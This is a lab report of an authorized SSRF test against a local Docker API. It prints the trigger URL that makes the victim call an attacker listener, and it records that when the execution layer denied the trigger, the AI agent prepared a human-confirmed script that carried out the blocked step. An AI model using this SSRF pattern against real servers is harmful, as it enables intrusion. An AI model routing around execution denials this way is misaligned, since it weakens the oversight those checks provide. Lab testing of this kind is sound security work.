> Public sanitized edition: sensitive personal, target, path, IP, alias, advisory, and run-specific evidence fields are redacted. This repository does not authorize live testing.

# Modern API SSRF True Attacker Callback — Verified Operator Run

Status: completed / verified-impact lab-only / operator-confirmed trigger
Date: 2026-05-23
Run ID: `modern_api_ssrf_operator_20260523T074358Z`
Route/tool: Windows Hermes control plane -> `<attacker-vm>` operator run -> `<victim-vm>` Docker target
Visible model/runtime for verification: `gpt-5.5 / openai-codex`

## Scope

- Attacker VM: `<attacker-vm>` / `<lab-ip>`
- Victim VM: `<victim-vm>` / `<lab-ip>`
- Target: `modern_vuln_api` Docker-published on `http://<lab-ip>:18081`
- Callback listener: Docker-published on `http://<lab-ip>:18183`
- Runner: `scripts/labs/operator_ssrf_true_callback_run.sh`
- Artifact root: `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/`

## Why operator-run

The same SSRF trigger was previously denied by the local execution layer. Hermes did not retry/bypass the denial. Hermes prepared and validated a bounded Kali-side operator script with an exact human confirmation gate. The operator manually confirmed:

```text
RUN_SSRF_ON_LOCAL_LAB
```

The script then sent exactly one local-lab SSRF trigger.

## Trigger

```text
GET http://<lab-ip>:18081/fetch?url=http%3A%2F%2F192.168.56.106%3A18183%2Fssrf-callback%3Fmarker%3Dmodern_api_ssrf_operator_20260523T074358Z
```

Expected callback destination:

```text
http://<lab-ip>:18183/ssrf-callback?marker=modern_api_ssrf_operator_20260523T074358Z
```

## Verified result

From `summary.md`:

```text
pre_health: 200
ssrf_trigger_status: 200
post_health: 200
callback_marker_found: yes
callback_source_victim_ip_found: yes
callback_trigger_path_found: yes
VERDICT=verified_impact_lab_only
```

From `callback/requests.jsonl`, the real trigger callback was received from the victim VM:

```json
{"client":"<lab-ip>","path":"/ssrf-callback?marker=modern_api_ssrf_operator_20260523T074358Z","headers":{"User-Agent":"HermesModernVulnAPI-SSRF-Lab"}}
```

A precheck callback also exists with `phase=precheck`; the second callback without `phase=precheck` is the SSRF trigger evidence.

## Key artifacts

- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/summary.md`
- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/run.log`
- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/callback/requests.jsonl`
- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/http/pre_health.json`
- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/http/ssrf_trigger_response.json`
- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/http/post_health.json`
- `<artifact-output-dir>/modern_api_ssrf_operator_20260523T074358Z/cleanup/attacker_internet.txt`

## Boundaries

- Local authorized lab only.
- Exactly one SSRF trigger request.
- Callback only to host-only attacker VM listener.
- No metadata endpoint.
- No localhost/internal scan.
- No public OAST/interactsh.
- No public/unknown target.
- No secrets, credentials, token capture, or exfiltration.
- No automatic report/finding promotion.

## Cleanup / recovery

Script cleanup removed:

- attacker callback container `ssrf-callback-18183`
- victim target container `modern-api-ssrf-18081`

Attacker Internet posture after cleanup:

```text
internet_closed
```

The run log also recorded victim Internet as closed before the run. No snapshot restore was required.

## Project value

This upgrades the SSRF lane from earlier local same-process callback and blocked true-attacker attempt to a verified cross-VM attacker-callback proof pattern:

```text
attacker VM -> victim target /fetch -> server-side victim request -> attacker listener
```

This is now a reusable callback evidence pattern for SSRF-like lanes, while preserving the safety boundary that sensitive triggers are operator-confirmed when execution tooling denies them.
